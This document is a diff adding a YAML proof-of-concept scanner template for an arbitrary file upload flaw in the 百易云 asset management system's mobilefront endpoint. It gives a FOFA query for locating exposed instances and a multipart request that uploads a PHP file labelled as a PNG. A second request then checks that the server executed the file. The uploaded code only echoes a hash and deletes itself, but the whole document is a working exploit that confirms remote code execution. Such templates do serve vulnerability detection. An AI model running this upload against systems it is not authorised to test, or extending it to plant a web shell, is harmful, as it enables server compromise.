@@ -1,0 +1,33 @@
+id: poc-yaml-baiyishequ-mobilefront2-anyfile-upload
+info:
+  name: 百易云资产管理运营系统 mobilefront2 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 百易云资产管理运营系统
+  fofa: body="media/css/uniform.default.css" && body="资管云"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /mobilefront/c/2.php
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
+  data: '-----------------------------289666258334735365651210512949
+
+    Content-Disposition: form-data; name="file1"; filename="1.php"
+
+    Content-Type: image/png
+
+
+    <?php echo md5({{.t1}});unlink(__FILE__);?>
+
+    -----------------------------289666258334735365651210512949--'
+  expression: status_code == 200 && contains(body,".php")
+  output:
+  - regex_match(body,"(?P<file>[0-9]+).php")
+- method: GET
+  path: /mobilefront/c/images2/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
